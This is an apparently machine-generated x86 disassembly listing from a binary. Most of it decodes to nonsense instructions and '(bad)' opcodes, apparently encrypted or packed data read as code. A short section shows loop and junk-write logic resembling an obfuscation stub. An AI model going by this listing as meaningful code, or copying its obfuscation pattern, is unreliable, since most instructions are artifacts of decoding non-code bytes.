  41372c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	inc    ebp
  41372f:	fsubr  QWORD PTR [edx-0x75c80641]
  413735:	xchg   ebx,eax
  413736:	or     eax,0x594e118f
  41373b:	xchg   BYTE PTR [ebx+0x6b],ch
  41373e:	sub    eax,0x80dcde8
  413743:	shr    BYTE PTR [ecx+0x69],cl
  413746:	xor    bl,BYTE PTR [ebp+0x515af8b7]
  41374c:	inc    ebp
  41374d:	iret   
  41374e:	loopne 0x413782
  413750:	mov    cl,0x3c
  413752:	mov    eax,ds:0x877c746e
  413757:	adc    DWORD PTR [ecx],ecx
  413759:	ret    0x71d5
  41375c:	dec    ebp
  41375d:	shl    BYTE PTR [edx],1
  41375f:	sub    BYTE PTR [ebx+esi*8],bl
  413762:	cmp    edi,eax
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	add    al,BYTE PTR [edi+0x78]
  413781:	in     eax,0x35
  413783:	imul   esi,DWORD PTR [eax+0x70],0xffffffb9
  413787:	jle    0x4137f9
  413789:	jo     0x413758
  41378b:	out    0x6b,al
  41378d:	push   edi
  41378e:	lea    esi,[ebp+0x5d1bd521]
  413794:	scas   eax,DWORD PTR es:[edi]
  413795:	out    0xf4,al
  413797:	fist   WORD PTR [ecx]
  413799:	imul   ecx,DWORD PTR [ecx+0x78],0x5ad256ea
  4137a0:	repnz aam 0x3a
  4137a3:	xor    esi,DWORD PTR ds:0xd5e0ed1b
  4137a9:	jle    0x41376b
  4137ab:	sbb    al,0x1e
  4137ad:	call   0x77e5:0x66c6329b
  4137b4:	fcomp  DWORD PTR [eax]
  4137b6:	inc    edi
  4137b7:	data16 int 0x58
  4137ba:	adc    ah,dh
  4137bc:	push   ebx
  4137bd:	push   0x48
  4137bf:	add    edx,DWORD PTR [ebx-0x39]
  4137c2:	outs   dx,BYTE PTR ds:[esi]
  4137c3:	sub    al,0x9b
  4137c5:	es and eax,0xb4c4963c
  4137cb:	fdivr  st(4),st
  4137cd:	repnz out 0x9a,eax
  4137d0:	repz or DWORD PTR [edx],esi
  4137d3:	inc    esi
  4137d4:	mov    BYTE PTR [edi+eax*1],cl
  4137d7:	mov    cl,0xf6
  4137d9:	or     DWORD PTR [esi],eax
  4137db:	push   0x4dcd8caf
  4137e0:	mov    ah,0xf5
  4137e2:	jno    0x41380f
  4137e4:	sub    BYTE PTR [ebx-0x368c61df],dh
  4137ea:	pop    ebp
  4137eb:	mov    ?,WORD PTR [ebp+0x47]
  4137ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137ef:	stos   BYTE PTR es:[edi],al
  4137f0:	scas   al,BYTE PTR es:[edi]
  4137f1:	push   esi
  4137f2:	neg    dh
  4137f4:	mov    al,0xf
  4137f6:	repnz stos DWORD PTR es:[edi],eax
  4137f8:	std    
  4137f9:	xchg   ecx,eax
  4137fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137fb:	es mov bh,0x2c
  4137fe:	mov    DWORD PTR [eax+eiz*2+0x38680953],eax
  413805:	jmp    0x41380d
  413807:	fistp  QWORD PTR ds:0xcffe2554
  41380d:	jecxz  0x4137fa
  41380f:	int3   
  413810:	test   al,0x1
  413812:	jns    0x4137ec
  413814:	ret    
  413815:	pop    ds
  413816:	sahf   
  413817:	jmp    0x1c4ad718
  41381c:	stos   BYTE PTR es:[edi],al
  41381d:	int3   
  41381e:	rcr    BYTE PTR ds:0x76c74dc0,0x96
  413825:	jge    0x4137d1
  413827:	pop    ecx
  413829:	mov    WORD PTR [esi-0x5aaebf34],fs
  41382f:	outs   dx,BYTE PTR ds:[esi]
  413830:	into   
  413831:	scas   eax,DWORD PTR es:[edi]
  413832:	rcr    BYTE PTR ds:0x9b0f5491,cl
  413838:	gs jle 0x41384d
  41383b:	ja     0x4137d1
  41383d:	out    dx,eax
  41383e:	sub    bl,BYTE PTR [edx-0x20]
  413841:	mov    edi,0xbadb1968
  413846:	pop    edi
  413847:	aas    
  413848:	pop    ebx
  413849:	and    bl,cl
  41384b:	jbe    0x41384e
  41384d:	xchg   ecx,eax
  41384e:	jne    0x41383d
  413850:	jg     0x413819
  413852:	in     eax,0xb8
  413854:	push   0xfffffff5
  413856:	icebp  
  413857:	jo     0x41383f
  413859:	dec    ebx
  41385a:	jne    0x413873
  41385c:	mov    ch,BYTE PTR [esi+0x56a340b7]
  413862:	add    ebp,DWORD PTR [ebx+0x17]
  413865:	pop    eax
  413866:	popa   
  413867:	jne    0x41380c
  413869:	shl    DWORD PTR [ebp+ebx*4-0x71ffff25],1
  413870:	adc    al,0x5e
  413872:	gs (bad) 
  413874:	sbb    al,0xba
  413876:	jno    0x413888
  413878:	mov    ecx,0x6f77fdd9
  41387d:	mov    esi,0x9b0d9591
  413882:	lds    sp,DWORD PTR [ebp-0x50]
  413886:	sti    
  413887:	lahf   
  413888:	in     eax,dx
  413889:	int    0xa0
  41388b:	rol    DWORD PTR ds:0x8c153bd1,cl
  413891:	mov    ebx,0x5d69a271
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	jg     0x413880
  413899:	cmp    dl,dl
  41389b:	xchg   ebx,ebx
  41389d:	clc    
  41389e:	imul   esp,ebx,0x709b380d
  4138a4:	std    
  4138a5:	xchg   esi,eax
  4138a6:	add    BYTE PTR [ebp+ebx*2+0x28],al
  4138aa:	inc    esp
  4138ab:	mov    DWORD PTR [edx+0x16],ebx
  4138ae:	scas   al,BYTE PTR es:[edi]
  4138af:	in     al,dx
  4138b0:	and    DWORD PTR [esi-0x2ccae30],edx
  4138b6:	(bad)  
  4138b7:	pusha  
  4138b8:	int3   
  4138b9:	ins    BYTE PTR es:[edi],dx
  4138ba:	pop    esp
  4138bb:	pop    edi
  4138bc:	mov    bl,0x8f
  4138be:	rcr    BYTE PTR [edx+0x28],1
  4138c1:	xor    al,0xa7
  4138c3:	adc    ecx,ecx
  4138c5:	mov    dl,0x1a
  4138c7:	mov    WORD PTR [esi-0x3a],cs
  4138ca:	pop    eax
  4138cb:	stos   BYTE PTR es:[edi],al
  4138cc:	mov    WORD PTR [eax+edx*2],fs
  4138cf:	xor    ah,BYTE PTR [eax]
  4138d1:	or     al,0xb9
  4138d3:	dec    ebp
  4138d4:	test   DWORD PTR [esi-0x6bfedead],edx
  4138da:	xor    al,0x45
  4138dc:	adc    BYTE PTR [ecx+eax*4+0x44a2ca94],0x24
  4138e4:	mov    ch,0x72
  4138e6:	adc    al,0x36
  4138e8:	jns    0x413923
  4138ea:	cmp    BYTE PTR [esi+edi*2-0x679cd813],cl
  4138f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138f2:	rcl    BYTE PTR [eax],cl
  4138f4:	cmp    ah,BYTE PTR [edi]
  4138f6:	cwde   
  4138f7:	cs inc edi
  4138f9:	pop    es
  4138fa:	mov    eax,0x1d5fb41b
  4138ff:	scas   al,BYTE PTR es:[edi]
  413900:	mov    bh,0x7b
  413902:	add    bh,ch
  413904:	fdiv   DWORD PTR [ebx+0x386c137]
  41390a:	mov    al,0x42
  41390c:	and    al,dl
  41390e:	jnp    0x4138d1
  413910:	xchg   ebp,eax
  413911:	mov    bl,BYTE PTR [ebx+0x24]
  413914:	ret    
  413915:	cmc    
  413916:	popf   
  413917:	push   ebx
  413918:	jnp    0x41395d
  41391a:	mov    ecx,0xb54003a6
  41391f:	mov    dl,0xd3
  413921:	cmp    BYTE PTR [eax],bh
  413923:	data16 jle 0x4138b6
  413926:	cs in  eax,0x7c
  413929:	adc    ebp,eax
  41392b:	sub    eax,0x7541c861
  413930:	mov    dh,0xbb
  413932:	stc    
  413933:	fwait
  413934:	shr    dl,cl
  413936:	inc    esi
  413937:	popa   
  413938:	in     al,0x45
  41393a:	ffreep st(3)
  41393c:	mov    BYTE PTR [ebp+0x71],0x65
  413940:	push   esi
  413941:	cmp    al,0xf3
  413943:	xchg   esi,eax
  413944:	and    ah,BYTE PTR [esi+0x517ebc7c]
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	and    al,0x51
  41394d:	sbb    eax,DWORD PTR [edi-0x63ba431c]
  413953:	sbb    ebx,DWORD PTR [eax+0x89d1ee0]
  413959:	inc    edi
  41395a:	mov    esi,edi
  41395c:	xor    esi,DWORD PTR [ebx-0x79]
  41395f:	in     eax,0x7
  413961:	jp     0x413927
  413963:	enter  0x6332,0x3a
  413967:	shl    BYTE PTR [esi+0xa],cl
  41396a:	das    
  41396b:	sbb    ebx,eax
  41396d:	fist   WORD PTR [ecx+0x160eb564]
  413973:	pop    edx
  413974:	ss jo  0x413952
  413977:	(bad)  
  413978:	(bad)  [esi-0x7b]
  41397b:	ds pop ds
  41397d:	add    eax,0x8381f018
  413982:	push   edx
  413983:	shl    BYTE PTR [ecx+0x5a],1
  413986:	inc    ebx
  413987:	and    esi,DWORD PTR [esi-0x4016fd12]
  41398d:	int3   
  41398e:	mov    ch,0xd8
  413990:	or     eax,0x64b21a8b
  413995:	jns    0x4139af
  413997:	sbb    ecx,DWORD PTR [ebx+0x4f]
  41399a:	bound  esi,QWORD PTR [ebx]
  41399c:	aas    
  41399d:	jmp    0x41393e
  41399f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139a0:	inc    esi
  4139a1:	cmp    al,ah
  4139a3:	adc    eax,0x36752de5
  4139a8:	imul   ebp,edi,0x41
  4139ab:	rcl    cl,0x69
  4139ae:	inc    esp
  4139af:	aas    
  4139b0:	dec    ecx
  4139b1:	(bad)  
  4139b2:	loop   0x413a2a
  4139b4:	mov    ecx,0x43df679f
  4139b9:	inc    eax
  4139ba:	out    dx,eax
  4139bb:	lods   al,BYTE PTR ds:[esi]
  4139bc:	jne    0x413a1c
  4139be:	mov    ah,BYTE PTR [eax]
  4139c0:	cmp    al,cl
  4139c2:	inc    edi
  4139c3:	pop    edx
  4139c4:	wrmsr  
  4139c6:	inc    eax
  4139c7:	into   
  4139c8:	pop    ebx
  4139c9:	inc    eax
  4139ca:	mov    al,0x46
  4139cc:	test   al,0xcf
  4139ce:	stos   DWORD PTR es:[edi],eax
  4139cf:	dec    eax
  4139d0:	pop    ds
  4139d1:	fsubr  QWORD PTR [edi+0x738a48f4]
  4139d7:	and    al,bl
  4139d9:	fisub  DWORD PTR [eax]
  4139db:	dec    eax
  4139dc:	pushf  
  4139dd:	cld    
  4139de:	sbb    al,0x29
  4139e0:	jmp    0x2d666e38
  4139e5:	and    BYTE PTR ds:0xfb297f72,cl
  4139eb:	cli    
  4139ec:	ror    bl,0xe
  4139ef:	in     eax,0xc4
  4139f1:	shr    DWORD PTR [ecx],cl
  4139f3:	adc    dl,ah
  4139f5:	sub    edi,DWORD PTR [edx-0x5db939ac]
  4139fb:	imul   edx,DWORD PTR [edx+0x32171823],0x4e
  413a02:	push   cs
  413a03:	shl    DWORD PTR [edi],0x5b
  413a06:	mov    esp,0xb9b2b906
  413a0b:	sti    
  413a0c:	sub    al,0x71
  413a0e:	scas   eax,DWORD PTR es:[edi]
  413a0f:	je     0x413a14
  413a11:	retf   0xa7dc
  413a14:	add    al,0xb
  413a16:	shr    DWORD PTR [ebp-0x2d],0x78
  413a1a:	test   al,0x9b
  413a1c:	mul    BYTE PTR [ebx+0x58e32ece]
  413a22:	push   ds
  413a23:	xor    DWORD PTR [eax-0x2f383540],esi
  413a29:	ror    BYTE PTR [edi],1
  413a2b:	mov    bh,0xf4
  413a2d:	pop    esp
  413a2e:	bound  ebp,QWORD PTR [ebx]
  413a30:	dec    ebx
  413a31:	jp     0x413a1c
  413a33:	gs jns 0x413a91
  413a36:	out    0xda,eax
  413a38:	xchg   ebx,eax
  413a39:	test   eax,0xb2a10dd
  413a3e:	adc    eax,0x29090e01
  413a43:	scas   eax,DWORD PTR es:[edi]
  413a44:	shl    DWORD PTR [edi-0x548556e4],1
  413a4a:	(bad)  
  413a4b:	cmp    esp,ecx
  413a4d:	mov    bl,0xd4
  413a4f:	les    esi,FWORD PTR [ebx]
  413a51:	call   0x40f7cd
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	mov    esi,fs
  413a69:	ds leave 
  413a6b:	jle    0x413ad5
  413a6d:	jo     0x413adf
  413a6f:	mov    ecx,0xac70707e
  413a74:	call   0x2e4c10d9
  413a79:	dec    ebx
  413a7a:	jge    0x413ae6
  413a7c:	push   esp
  413a7d:	repnz mov bh,0x8d
  413a80:	jb     0x413a13
  413a82:	pusha  
  413a83:	inc    ebp
  413a84:	ret    0xe941
  413a87:	out    dx,eax
  413a88:	jmp    0x5672:0x2c5ebd6d
  413a8f:	jae    0x413aba
  413a91:	add    eax,DWORD PTR [esi]
  413a93:	lea    esi,[ecx]
  413a95:	and    esp,edx
  413a97:	aam    0xfb
  413a99:	push   es
  413a9a:	or     DWORD PTR [eax],ecx
  413a9c:	ja     0x413ae9
  413a9e:	add    esp,0xdcf45031
  413aa4:	cmp    al,0x70
  413aa6:	jnp    0x413a87
  413aa8:	ja     0x413a58
  413aaa:	inc    ecx
  413aab:	test   DWORD PTR [esi],esp
  413aad:	add    al,dh
  413aaf:	je     0x413ac4
  413ab1:	jnp    0x413b21
  413ab3:	inc    esi
  413ab4:	fiadd  DWORD PTR [ecx]
  413ab6:	lds    ecx,FWORD PTR [esi+0x55c94d2f]
  413abc:	cmp    DWORD PTR [ebp+0x59],esi
  413abf:	cwde   
  413ac0:	jge    0x413a74
  413ac2:	jo     0x413a7c
  413ac4:	ret    
  413ac5:	pop    ebx
  413ac6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ac7:	pop    edi
  413ac8:	das    
  413ac9:	aad    0xfa
  413acb:	sbb    al,0x10
  413acd:	xchg   esi,eax
  413ace:	pop    esi
  413acf:	jg     0x413a57
  413ad1:	fwait
  413ad2:	stos   BYTE PTR es:[edi],al
  413ad3:	cwde   
  413ad4:	hlt    
  413ad5:	inc    ch
  413ad7:	cs mov al,ah
  413ada:	or     bl,BYTE PTR [ebx-0x6c]
  413add:	ror    BYTE PTR [eax+0x10],1
  413ae0:	(bad)  
  413ae1:	pop    edi
  413ae2:	jmp    0x413aeb
  413ae4:	aam    0xdb
  413ae6:	or     BYTE PTR [eax-0xb],cl
  413ae9:	fsub   DWORD PTR [ebx]
  413aeb:	stos   DWORD PTR es:[edi],eax
  413aec:	add    BYTE PTR [edi+0x3a],0x60
  413af0:	push   ecx
  413af1:	adc    ebx,esp
  413af3:	mov    eax,ds:0x87313cea
  413af8:	sub    BYTE PTR [esi+0x19],cl
  413afb:	xchg   esi,eax
  413afc:	cwde   
  413afd:	inc    edi
  413afe:	jne    0x413b73
  413b00:	nop
  413b01:	out    dx,eax
  413b02:	stc    
  413b03:	mov    dh,0x81
  413b05:	into   
  413b06:	jo     0x413b81
  413b08:	xlat   BYTE PTR ds:[ebx]
  413b09:	add    dh,BYTE PTR [edx+0x3bee3026]
  413b0f:	push   cs
  413b10:	aam    0x2f
  413b12:	js     0x413b40
  413b14:	rcr    DWORD PTR [eax],cl
  413b16:	rcl    ah,1
  413b18:	inc    eax
  413b19:	enter  0x11f4,0x31
  413b1d:	dec    esi
  413b1e:	xor    al,0x1a
  413b20:	lods   al,BYTE PTR ds:[esi]
  413b21:	xchg   DWORD PTR [edx+0x41e3cc2],edx
  413b27:	xchg   esi,eax
  413b28:	pop    ds
  413b29:	bts    DWORD PTR [ecx],edx
  413b2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b2d:	jns    0x413b68
  413b2f:	std    
  413b30:	in     al,dx
  413b31:	scas   al,BYTE PTR es:[edi]
  413b32:	sub    BYTE PTR [esp+edx*2],cl
  413b35:	in     al,dx
  413b36:	cli    
  413b37:	aad    0x8c
  413b39:	sub    cl,BYTE PTR [ebp-0x22535c58]
  413b3f:	mov    dl,0x7d
  413b41:	adc    eax,0x1b7ccb23
  413b46:	adc    ebp,esi
  413b48:	xor    al,0x78
  413b4a:	pop    edx
  413b4b:	xchg   edi,eax
  413b4c:	arpl   WORD PTR [eax+edi*4+0x2b],bx
  413b50:	sbb    esi,0x71
  413b53:	retf   
  413b54:	adc    BYTE PTR [edx+0x29],cl
  413b57:	fdivr  QWORD PTR [ebp+0x20]
  413b5a:	sbb    al,0xfa
  413b5c:	(bad)  
  413b5e:	cmovne eax,DWORD PTR [edx+0x3c66c7ba]
  413b65:	sbb    DWORD PTR [edi],eax
  413b67:	mov    ebx,0xbeb62ade
  413b6c:	inc    ebx
  413b6d:	xchg   esi,eax
  413b6e:	pop    eax
  413b6f:	mov    ebx,0xea5323c
  413b74:	arpl   WORD PTR [ebp+0x37138302],sp
  413b7a:	jle    0x413bda
  413b7c:	aad    0x7f
  413b7e:	add    ebp,eax
  413b80:	add    esi,edx
  413b82:	xchg   esp,eax
  413b83:	popa   
  413b84:	pushf  
  413b85:	ins    DWORD PTR es:[edi],dx
  413b86:	mov    WORD PTR [esp+ebx*4-0x3a64da8c],?
  413b8d:	jne    0x413b68
  413b8f:	imul   eax,DWORD PTR [esi-0x7c],0x371b818e
  413b96:	retf   
  413b97:	jmp    0x3d4:0x2145b950
  413b9e:	xchg   cl,al
  413ba0:	mov    esi,0x27e5370d
  413ba5:	mov    ds:0xa7c0907f,eax
  413baa:	test   edi,edx
  413bac:	fs popf 
  413bae:	pop    eax
  413baf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bb0:	neg    DWORD PTR [eax+0x17]
  413bb3:	sbb    edx,DWORD PTR [edx-0x32]
  413bb6:	and    ebx,DWORD PTR [esi]
  413bb8:	pop    edx
  413bb9:	pushf  
  413bba:	pop    esp
  413bbb:	cmp    eax,0xa1e855da
  413bc0:	xor    al,0x13
  413bc2:	pop    edx
  413bc3:	cdq    
  413bc4:	mov    DWORD PTR ds:0x87a3a122,eax
  413bca:	pop    edi
  413bcb:	or     ch,BYTE PTR [eax+0x55]
  413bce:	retf   
  413bcf:	mov    edi,0xff1c92b8
  413bd4:	imul   esp,DWORD PTR [eax],0x3b
  413bd7:	dec    eax
  413bd8:	add    eax,0x50ffcf56
  413bdd:	fdiv   st(2),st
  413bdf:	xor    eax,0x31a6baa7
  413be4:	adc    al,0xf3
  413be6:	inc    eax
  413be7:	sbb    eax,0x4d6de056
  413bec:	loop   0x413bc6
  413bee:	(bad)  
  413bef:	gs jmp 0x36da:0x10aed4b1
  413bf7:	ret    0x1be4
  413bfa:	push   es
  413bfb:	jmp    0x8f22:0xaad47abb
  413c02:	scas   al,BYTE PTR es:[edi]
  413c03:	and    edx,DWORD PTR [eax]
  413c05:	and    BYTE PTR [ebp-0x5738d368],al
  413c0b:	fld    TBYTE PTR [ebx+0x3]
  413c0e:	jae    0x413c01
  413c10:	push   0xffffffdf
  413c12:	ins    DWORD PTR es:[edi],dx
  413c13:	or     ebx,DWORD PTR [esi+eax*1+0x1e9d129a]
  413c1a:	sbb    al,0xf8
  413c1c:	sub    DWORD PTR [ecx],edi
  413c1e:	mov    bh,0xf3
  413c20:	jo     0x413c21
  413c22:	inc    eax
  413c23:	scas   eax,DWORD PTR es:[edi]
  413c24:	xchg   edx,eax
  413c25:	mov    fs,WORD PTR [edx+0x48]
  413c28:	gs push eax
  413c2a:	push   esp
  413c2b:	mov    DWORD PTR [ecx],edx
  413c2d:	rcr    al,1
  413c2f:	dec    eax
  413c30:	les    ecx,FWORD PTR [edi-0x716b86f3]
  413c36:	fcomp  QWORD PTR ds:[edx-0x2f5a9899]
  413c3d:	das    
  413c3e:	(bad)  
  413c3f:	xchg   ebx,eax
  413c40:	pusha  
  413c41:	fmul   DWORD PTR [edi+0x42]
  413c44:	in     al,dx
  413c45:	cld    
  413c46:	fsub   QWORD PTR [eax+0x6a4310e8]
  413c4c:	scas   eax,DWORD PTR es:[edi]
  413c4d:	push   ecx
  413c4e:	call   0x3aedf6ee
  413c53:	mov    cl,0x7d
  413c55:	nop
  413c56:	jle    0x413bfa
  413c58:	ret    0xbab5
  413c5b:	scas   al,BYTE PTR es:[edi]
  413c5c:	cs push 0x37db0894
  413c62:	stc    
  413c63:	(bad)  
  413c64:	das    
  413c65:	in     al,dx
  413c66:	jg     0x413ca2
  413c68:	push   esp
  413c69:	(bad)  
  413c6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c6b:	call   0xc6c:0x7052661d
  413c72:	pop    edi
  413c73:	xchg   BYTE PTR [eax+0x7],bl
  413c76:	dec    ecx
  413c77:	cs fcomi st,st(2)
  413c7a:	mov    ebp,0x2bf01956
  413c7f:	inc    ebx
  413c80:	mov    dh,0x31
  413c82:	dec    esp
  413c83:	pop    edi
  413c84:	push   ebp
  413c85:	mov    esi,0xfbea0463
  413c8a:	adc    ebx,edi
  413c8c:	mov    ah,0x1a
  413c8e:	imul   ebx,edi,0x35
  413c91:	ins    DWORD PTR es:[edi],dx
  413c92:	test   eax,0x3f26271f
  413c97:	sbb    bl,BYTE PTR [edx-0x71e6947d]
  413c9d:	sub    BYTE PTR ds:0x3da96737,0x8c
  413ca4:	jbe    0x413c6f
  413ca6:	xchg   edi,eax
  413ca7:	bound  esp,QWORD PTR [edx+0x6e]
  413caa:	fbld   TBYTE PTR [eax+0x2c]
  413cad:	repz cli 
  413caf:	jno    0x413c60
  413cb1:	fsubr  QWORD PTR [ecx-0x30]
  413cb4:	pop    ebx
  413cb5:	mov    eax,cs
  413cb7:	dec    edx
  413cb8:	lods   eax,DWORD PTR ds:[esi]
  413cb9:	pop    ebx
  413cba:	push   eax
  413cbb:	add    edx,esp
  413cbd:	pop    es
  413cbe:	mov    eax,ds:0x1bf91780
  413cc3:	push   ecx
  413cc4:	rcl    BYTE PTR [edi+0xc5c1cf5],cl
  413cca:	push   es
  413ccb:	jle    0x413cbd
  413ccd:	test   BYTE PTR [eax+0x73],ch
  413cd0:	cmp    cl,BYTE PTR [esi]
  413cd2:	scas   al,BYTE PTR es:[edi]
  413cd3:	jmp    0x413c8a
  413cd5:	hlt    
  413cd6:	aad    0x35
  413cd8:	in     eax,0x7b
  413cda:	mov    dl,0xcc
  413cdc:	scas   al,BYTE PTR es:[edi]
  413cdd:	dec    ecx
  413cde:	push   0xffffffa3
  413ce0:	nop
  413ce1:	test   al,0xa3
  413ce3:	mov    cl,0x1f
  413ce5:	lods   eax,DWORD PTR ds:[esi]
  413ce6:	and    cl,al
  413ce8:	cmp    DWORD PTR [esi+0x2c17a061],esi
  413cee:	iret   
  413cef:	(bad)  
  413cf1:	in     eax,0xdb
  413cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cf4:	shl    bh,1
  413cf6:	lock test BYTE PTR ss:[ebx+0x1c],0x64
  413cfc:	jmp    0x5ad8:0x62ed7c06
  413d03:	mov    al,ds:0x5db06ec1
  413d08:	pop    eax
  413d09:	push   ss
  413d0a:	push   ss
  413d0b:	jno    0x413d1f
  413d0d:	lods   al,BYTE PTR ds:[esi]
  413d0e:	dec    esp
  413d0f:	inc    ebp
  413d10:	xchg   DWORD PTR [ebx],esp
  413d12:	mov    ds:0xf9198f6,al
  413d17:	int    0x4c
  413d19:	push   bp
  413d1b:	mov    ebp,0x508fcaf8
  413d20:	aas    
  413d21:	jae    0x413d78
  413d23:	add    BYTE PTR [ebp-0x56704095],dl
  413d29:	inc    ebp
  413d2a:	adc    bh,BYTE PTR [esi]
  413d2c:	mov    edi,0x818dc90c
  413d31:	xor    BYTE PTR [edi+0x15],0x54
  413d35:	pop    ebx
  413d36:	aaa    
  413d37:	mov    edx,0x4589b763
  413d3c:	loopne 0x413cc9
  413d3e:	inc    ebp
  413d3f:	cld    
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e6ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e6ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e6ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e56b
  413d7f:	cmp    DWORD PTR ds:0x42e6ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e6ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e6ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e6ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e6ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e70f,0x42fd86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e12c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e6f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fcd9,0x42e120
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e6fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e6fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e6fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e6fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e6fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e48b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e6f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fd8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e703
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e11c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e6fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)  
  413e8b:	fidiv  DWORD PTR [ebx+0x7647fdaa]
  413e91:	jo     0x413f03
  413e93:	mov    ecx,0xbc70707e
  413e98:	idiv   dl
  413e9a:	sbb    al,0x14
  413e9c:	retf   
  413e9d:	jecxz  0x413eec
  413e9f:	das    
  413ea0:	sub    DWORD PTR [edi+edi*8+0x56],esi
  413ea4:	arpl   WORD PTR [esi],di
  413ea6:	push   ebp
  413ea7:	mov    WORD PTR [ecx+edi*8],?
  413eaa:	sbb    cl,dh
  413eac:	sbb    bh,BYTE PTR [edi]
  413eae:	imul   edi,edi,0x6d
  413eb1:	cs (bad) 
  413eb3:	outs   dx,DWORD PTR ds:[esi]
  413eb4:	mov    bl,BYTE PTR [edx]
  413eb6:	jle    0x413f08
  413eb8:	loopne 0x413ea8
  413eba:	cmp    al,0x95
  413ebc:	pop    ebp
  413ebd:	sbb    eax,0x599b4570
  413ec2:	cmp    DWORD PTR [esi+0x66cfd0c8],eax
  413ec8:	jns    0x413f0d
  413eca:	(bad)  
  413ecc:	ja     0x413e82
  413ece:	ins    DWORD PTR es:[edi],dx
  413ecf:	div    DWORD PTR [esp+ecx*2]
  413ed2:	push   cs
  413ed3:	stc    
  413ed4:	xor    al,0xd0
  413ed6:	pushf  
  413ed7:	(bad)  
  413ed9:	pusha  
  413eda:	jb     0x413ee8
  413edc:	mov    eax,0xfe26f9ae
  413ee1:	lahf   
  413ee2:	js     0x413ec1
  413ee4:	xchg   esp,eax
  413ee5:	addr16 dec edi
  413ee7:	scas   al,BYTE PTR es:[edi]
  413ee8:	int3   
  413ee9:	sub    eax,0x802b063f
  413eee:	retf   0x1114
  413ef1:	test   DWORD PTR [ebx],edi
  413ef3:	imul   ecx,ecx,0x6e156c96
  413ef9:	retf   
  413efa:	gs inc ebx
  413efc:	mov    ebp,0x6ef9baa1
  413f01:	sbb    eax,0x1019f7f5
  413f06:	or     ecx,esi
  413f08:	mov    bl,0x30
  413f0a:	mov    cl,0x37
  413f0c:	mov    dh,0x98
  413f0e:	js     0x413ed3
  413f10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f11:	jp     0x413f6a
  413f13:	push   ss
  413f14:	mov    ds:0x31778e66,eax
  413f19:	jp     0x413f50
  413f1b:	or     DWORD PTR [edi-0x2728e185],edi
  413f21:	mov    cs,WORD PTR [ebp+0x6cb29c37]
  413f27:	sub    BYTE PTR [eax-0x7f924099],ch
